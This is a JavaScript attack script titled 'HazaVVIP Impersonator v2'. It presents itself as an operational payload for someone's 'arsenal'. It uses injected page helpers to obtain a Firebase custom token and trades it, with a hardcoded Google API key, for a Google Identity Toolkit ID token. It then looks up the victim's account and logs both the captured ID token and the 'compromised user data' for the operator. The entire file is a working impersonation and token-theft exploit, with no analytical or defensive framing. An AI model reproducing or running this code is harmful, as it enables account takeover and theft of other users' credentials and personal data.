/**
 * =============================================================================
 *  HazaVVIP Impersonator v2 (Operational Payload with Token Exfil)
 * =============================================================================
 *  This is the finalized, operational version of the live impersonation attack
 *  vector discovered and perfected by HazaVVIP. It silently acquires a live
 *  JWT, exchanges it for a Google ID token, and returns BOTH the compromised
 *  user's identity data and the powerful ID Token used to access it.
 *
 *  - Finalized for HazaVVIP's arsenal.
 *  - Silent execution, returns the final data and token, or a critical error.
 *  - UPDATE: Now explicitly displays the captured ID Token on success.
 * =============================================================================
 */
(async () => {
    // Self-contained attack function
    const executeImpersonation = async () => {
        // --- DEPENDENCY & TARGET VALIDATION ---
        if (typeof window.probe !== 'function' || typeof window.requestNewFirebaseToken !== 'function') {
            throw new Error("FATAL: Missing required functions (probe or requestNewFirebaseToken).");
        }

        // --- STAGE 1: DYNAMICALLY ACQUIRE LIVE JWT ---
        const customToken = await window.requestNewFirebaseToken();
        if (!customToken) {
            throw new Error("Stage 1 FAILED: requestNewFirebaseToken did not return a token.");
        }

        // --- STAGE 2: EXCHANGE JWT FOR ID TOKEN ---
        const apiKey = "AIzaSyCqyCcs2R2e7AegGjvFAwG98wlamtbHvZY"; // Reliable constant
        const signInEndpoint = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${apiKey}`;
        
        const signInResult = await window.probe(signInEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: customToken, returnSecureToken: true })
        });

        if (signInResult.status !== 200) {
            throw new Error(`Stage 2 FAILED: Token exchange rejected with status ${signInResult.status}. Body: ${signInResult.body}`);
        }
        const idToken = JSON.parse(signInResult.body).idToken;

        // --- STAGE 3: PROVE IMPERSONATION ---
        const lookupEndpoint = `https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${apiKey}`;
        const lookupResult = await window.probe(lookupEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ idToken: idToken })
        });

        if (lookupResult.status !== 200) {
            throw new Error(`Stage 3 FAILED: ID Token lookup rejected with status ${lookupResult.status}. Body: ${lookupResult.body}`);
        }
        
        // --- MISSION SUCCESS: RETURN THE SPOILS ---
        const compromisedUserData = JSON.parse(lookupResult.body);
        return { compromisedUserData, idToken }; // Return both pieces of data
    };

    try {
        const { compromisedUserData, idToken } = await executeImpersonation();
        
        // Log the final, successful results for the operator.
        log.success("✅✅✅ IMPERSONATION SUCCESSFUL ✅✅✅");
        
        log.warn("\nCompromised User Data:");
        log.info(compromisedUserData);
        
        log.warn("\nCaptured ID Token (JWT):");
        log._append(idToken, 'var(--color-success)', 'ID_TOKEN>'); // Use special logger for the token
        
        // Return data for potential chaining in other scripts.
        return { compromisedUserData, idToken };
    } catch (err) {
        log.error("❌❌❌ IMPERSONATION FAILED ❌❌❌");
        log.error(err.message);
        // Propagate the error.
        throw err;
    }
})();